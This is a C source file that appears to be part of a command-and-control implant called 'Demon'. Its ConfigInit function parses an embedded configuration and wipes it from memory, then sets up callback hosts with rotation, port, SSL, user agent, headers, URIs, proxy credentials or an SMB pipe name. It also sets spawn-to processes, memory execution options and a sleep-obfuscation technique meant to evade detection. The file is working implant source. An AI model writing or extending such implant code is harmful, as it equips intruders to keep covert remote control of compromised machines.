
#include <Demon.h>

#include <Core/Config.h>
#include <Core/Parser.h>
#include <Core/MiniStd.h>

BYTE AgentConfig[ CONFIG_SIZE ]  = CONFIG_BYTES;

// TODO: Clear memory at exit
VOID ConfigInit()
{
    PARSER Parser = { 0 };
    PVOID  Buffer = NULL;
    DWORD  Length = 0;
    DWORD  J      = 0;
    
    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )

    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );

    Instance->Config.Sleeping       = ParserGetInt32( &Parser );

    Instance->Config.Memory.Alloc   = ParserGetInt32( &Parser );
    Instance->Config.Memory.Execute = ParserGetInt32( &Parser );

    PRINTF(
        "[CONFIG] Memory: \n"
        " - Allocate: %d  \n"
        " - Execute : %d  \n",
        Instance->Config.Memory.Alloc,
        Instance->Config.Memory.Execute
    )

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance->Config.Process.Spawn64 = Instance->Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance->Config.Process.Spawn64, Buffer, Length );
    Instance->Config.Process.Spawn64[ Length ] = 0;

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance->Config.Process.Spawn86, Buffer, Length );
    Instance->Config.Process.Spawn86[ Length ] = 0;

    PRINTF(
        "[CONFIG] Spawn: \n"
        " - [x64] => %s  \n"
        " - [x86] => %s  \n",
        Instance->Config.Process.Spawn64,
        Instance->Config.Process.Spawn86
    )

    Instance->Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );

    PRINTF(
        "[CONFIG] Sleep Obfuscation: \n"
        " - Technique: %d \n",
        Instance->Config.Implant.SleepMaskTechnique
    )

#ifdef TRANSPORT_HTTP
    Instance->Config.Transport.Method       = L"POST";
    Instance->Config.Transport.HostRotation = ParserGetInt32( &Parser );

    J = ParserGetInt32( &Parser );
    Instance->Config.Transport.Hosts = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Hosts [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance->Config.Transport.Hosts[ i ] = Instance->Win32.LocalAlloc( LPTR, Length );
        MemCopy( Instance->Config.Transport.Hosts[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance->Config.Transport.Hosts[ i ] );
#endif
    }
    Instance->Config.Transport.Hosts[ J + 1 ] = NULL;
    Instance->Config.Transport.HostIndex      = 0;

    // Listener Port
    Instance->Config.Transport.Port = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Port: %d\n", Instance->Config.Transport.Port );

    // Listener Secure (SSL)
    Instance->Config.Transport.Secure = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Secure: %s\n", Instance->Config.Transport.Secure ? "TRUE" : "FALSE" );

    // UserAgent
    Buffer = ParserGetBytes( &Parser, &Length );
    Instance->Config.Transport.UserAgent = Instance->Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance->Config.Transport.UserAgent, Buffer, Length );
    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance->Config.Transport.UserAgent );

    // Headers
    J = ParserGetInt32( &Parser );
    Instance->Config.Transport.Headers = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Headers [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance->Config.Transport.Headers[ i ] = Instance->Win32.LocalAlloc( LPTR, Length );
        MemCopy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance->Config.Transport.Headers[ i ] );
#endif
    }
    Instance->Config.Transport.Headers[ J + 1 ] = NULL;

    // Uris
    J = ParserGetInt32( &Parser );
    Instance->Config.Transport.Uris = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Uris [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance->Config.Transport.Uris[ i ] = Instance->Win32.LocalAlloc( LPTR, Length );
        MemCopy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance->Config.Transport.Uris[ i ] );
#endif
    }
    Instance->Config.Transport.Uris[ J + 1 ] = NULL;

    // check if proxy connection is enabled
    Instance->Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
    if ( Instance->Config.Transport.Proxy.Enabled )
    {
        PUTS( "[CONFIG] [PROXY] Enabled" );
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance->Config.Transport.Proxy.Url = Instance->Win32.LocalAlloc( LPTR, Length );
        MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance->Config.Transport.Proxy.Url );

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance->Config.Transport.Proxy.Username = Instance->Win32.LocalAlloc( LPTR, Length );
            MemCopy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance->Config.Transport.Proxy.Username );
        }
        else
            Instance->Config.Transport.Proxy.Username = NULL;

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance->Config.Transport.Proxy.Password = Instance->Win32.LocalAlloc( LPTR, Length );
            MemCopy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance->Config.Transport.Proxy.Password );
        }
        else
            Instance->Config.Transport.Proxy.Password = NULL;
    }
    else
    {
        PUTS( "[CONFIG] [PROXY] Disabled" );
    }

#elif TRANSPORT_SMB

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance->Config.Transport.Name = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
    CharStringToWCharString( Instance->Config.Transport.Name, Buffer, Length );

    PRINTF( "[CONFIG] PipeName: %ls\n", Instance->Config.Transport.Name );

#endif
    ParserDestroy( &Parser );
}